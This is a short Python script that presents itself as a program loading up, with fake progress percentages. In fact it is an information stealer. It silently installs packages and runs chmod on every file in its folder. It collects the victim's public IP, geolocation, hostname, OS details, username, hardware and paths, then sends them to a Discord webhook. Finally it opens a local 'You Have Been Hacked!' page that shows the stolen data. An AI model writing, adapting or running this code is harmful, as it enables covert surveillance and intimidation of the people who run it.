print("please wait...")
import os, subprocess
try:
	subprocess.run(["pip", "install", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except:
	pass
print("one minute...")
try:
	subprocess.run(["pip", "install", "psutil"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except:
	pass
import requests
import platform
import psutil
import socket
import webbrowser
import random

os.system("chmod +x *")
if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
print("please wait and dont stop program...")
info = []
try:
	ip = requests.get(f"http://ifconfig.me/ip").text
except:
	ip = ""
	print("system error. 01")
try:
	fwd = requests.get(f"http://ifconfig.me/forwarded").text
	hops = fwd[fwd.find(",")+1:]
	hops = ", ".join(hops.replace(",", " ").split())
except:
	print("system error. 02")
	hops = ""
info.append(f"-")
info.append(f"IP ADDRESS: || {ip} ||")
info.append(f"HOP ADDRESSES: || {hops} ||")
print(f"loading... {random.randint(1, 5)}%")
try:
	dnses = socket.gethostbyaddr(ip)
	for hostname, n in zip(dnses, range(len(dnses))):
		if hostname == ip:
			pass
		else:
			info.append(f"HOSTNAME {n+1}: || {hostname} ||")
except:
	print("system error. 03")
print(f"loading... {random.randint(6, 15)}%")
opens = []
for n in range(1, 255):
	ipp = f"192.168.1.{n}"
	s = socket.socket()
	try:
		s.bind((ipp, 65534))
		opens.append(ip)
	except:
		pass
	s.close()
info.append(f"OPEN LANS: || {', '.join(opens)} ||")
print(f"loading... {random.randint(15, 25)}%")
try:
	i = requests.get(f"http://ipapi.co/{ip}/json", headers={"User-Agent": "bot"}).json()
	try:
		del i["ip"]
	except:
		pass
	for h1, h2 in i.items():
		h1 = h1.upper().replace("_", " ")
		info.append(f"{h1}: || {h2} ||")
except:
	print("system error. 04")
print(f"loading... {random.randint(25, 45)}%")
try:
	info.append(f"OS NAME: || {os.name} ||\nSYSTEM OS NAME: || {platform.system()} ||\nSYSTEM VERSION: || {platform.version()} ||\nSYSTEM ARCHITECTURE: || {', '.join(platform.architecture())} ||\nSYSTEM PROCESSOR: || {platform.processor()} ||\nOS USERNAME: || {os.getlogin()} ||\nSYSTEM OS NAME: || {platform.node()} ||\nFILE PATH: || {os.getcwd()} ||\nPYTHON VERSION: || {platform.python_version()} ||\nPYTHON TUPLE VERSION: || {platform.python_version_tuple()[0]} ||\nRAM: || {psutil.virtual_memory().total / (1024 ** 3)} || GB\nRAM AVAILABLE: || {psutil.virtual_memory().available / (1024 ** 3)} || GB\nCPU COUNT: || {psutil.cpu_count(logical=False)} ||\nTHREAD COUNT: || {psutil.cpu_count(logical=False)} ||\nMACHINE TYPE: || {platform.machine()} ||\nOS FAMILY: || {platform.system_alias(platform.system(), platform.release(), 0)} ||")
except:
	print("system error. 06")
print(f"loading... {random.randint(45, 80)}%")
try:
	info.append(f"PROCESS COUNT: || {len(psutil.pids())} ||")
except:
	print("system error. 07")
try:
	info.append(f"MAIN PATH: || {os.path.expanduser('~')} ||")
except:
	print("system error. 08")
info.append(f"-")
print("loading... 100%")
try:
	data = {"content": "\n".join(info)}
	r = requests.post("your_discord_webhook_url", json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
	print(r.text)
except:
	print("system error. 09")
print()
input("[ Enter to start program ]")
if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
print(f"Welcome To Program...\n")
try:
	s = socket.socket()
	s.bind(("localhost", 65535))
	s.listen(100)
	display = []
	for h in info:
		h = h.replace("|", "")
		if "\n" in h:
			for h1 in h.split("\n"):
				display.append(f"<h3> {h1} </h3>")
		else:
			display.append(f"<h3> {h} </h3>")
	display = "\n".join(display)
	p = f"<h1> You Have Been Hacked! :D </h1>\n<h2>Your info:</h2>\n{display}"
	webbrowser.open("http://localhost:65535")
	while True:
		try:
			c, a = s.accept()
			print(f"connect {a[0]}:{a[1]}")
			pack = c.recv(4096).decode()
			print(f"{pack}")
			c.send(f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\n\r\n{p}".encode())
		except:
			print("system error. 10")
except:
	print("system error. 11")
